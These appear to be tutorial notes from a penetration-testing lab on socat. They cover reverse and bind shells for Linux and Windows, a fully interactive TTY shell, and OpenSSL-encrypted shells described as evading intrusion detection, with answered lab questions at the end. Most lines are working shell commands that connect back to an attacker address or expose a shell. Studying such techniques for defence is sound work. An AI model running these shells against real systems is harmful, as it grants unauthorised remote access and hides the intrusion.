Socat is similar to netcat in some ways, but fundamentally different in many others. The easiest way to think about socat is as a connector between two points. This will essentially be a listening port and a file, or indeed, two listening ports.

- **_Reverse Shells_**
	Here's the syntax for a basic reverse shell listener in socat:  
	`socat TCP-L:<port> -`

On Windows we would use this command to connect back:
`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`

On a Linux target we would use the following command:
`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`

The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.

- **_Bind Shells_**
	We use this command on our attacking machine to connect to the waiting listener:
	`socat TCP:<TARGET-IP>:<TARGET-PORT> -`

On a Windows target we would use this command for our listener:
`socat TCP-L:<PORT> EXEC:powershell.exe,pipes`

On a Linux target we would use the following command:
`socat TCP-L:<PORT> EXEC:"bash -li"`

We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.

### Fully stable Linux tty reverse shell
This will only work when the target is Linux, but is _significantly_ more stable. The following technique is perhaps one of its most useful applications. Here is the new listener syntax:

`socat TCP-L:<port> FILE:`tty`,raw,echo=0`

As usual, we're connecting two points together. In this case those points are a listening port, and a file. Specifically, we are passing in the current TTY as a file and setting the echo to be zero. This is approximately equivalent to using the Ctrl + Z, `stty raw -echo; fg` trick with a netcat shell -- with the added bonus of being immediately stable and hooking into a full tty.

The first listener can be connected to with any payload; however, this special listener must be activated with a very specific socat command. This means that the target must have socat installed. Most machines do not have socat installed by default, however, it's possible to upload a [precompiled socat binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true), which can then be executed as normal. The special command is as follows:

`socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li", pty, stderr, sigint, setsid, sane`

The first part is easy -- we're linking up with the listener running on our own machine. The second part of the command creates an interactive bash session with  `EXEC:"bash -li"`. We're also passing the arguments: pty, stderr, sigint, setsid and sane:

- **pty**, allocates a pseudoterminal on the target -- part of the stabilisation process
- **stderr**, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)  
- **sigint**, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
- **setsid**, creates the process in a new session
- **sane**, stabilises the terminal, attempting to "normalise" it.

On the left we have a listener running on our local attacking machine, on the right we have a simulation of a compromised target, running with a non-interactive shell. Using the non-interactive netcat shell, we execute the special socat command, and receive a fully interactive bash shell on the socat listener to the left.

## **Socat Encrypted Shells**  
One of the many great things about socat is that it's capable of creating encrypted shells -- both bind and reverse. Why would we want to do this? Encrypted shells cannot be spied on unless you have the decryption key, and are often able to bypass an IDS as a result.

Suffice to say that any time `TCP` was used as part of a command, this should be replaced with `OPENSSL` when working with encrypted shells.

We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine.  This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.
`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`

We then need to merge the two created files into a single `.pem` file:
`cat shell.key shell.crt > shell.pem`

Now, when we set up our reverse shell listener, we use:
`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`

This sets up an OPENSSL listener using our generated certificate. `verify=0` tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. 

*Note:*
	The certificate _must_ be used on whichever device is listening.


To connect back, we would use:
`socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`

The same technique would apply for a bind shell:

Target:
`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`  

Attacker:
`socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`  

Again, note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.


The following image shows an OPENSSL Reverse shell from a Linux target. The target is on the right, and the attacker is on the left:

Q) What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called “encrypt.pem”.

- (normal reverse shell )
	`socat TCP-L:53 FILE:tty,raw,echo=0`  

- (encrypted using openssl )
	`socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:tty,raw,echo=0` 

Q) If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?

- the regular syntax is this: 
  `socat TCP:10.10.10.5:53 EXEC:”bash -li”, pty, stderr, sigint, setsid, sane`

- encrypted using openssl:
  `socat OPENSSL:10.10.10.5:53,verify=0 EXEC:”bash -li”, pty, stderr, sigint, setsid, sane`
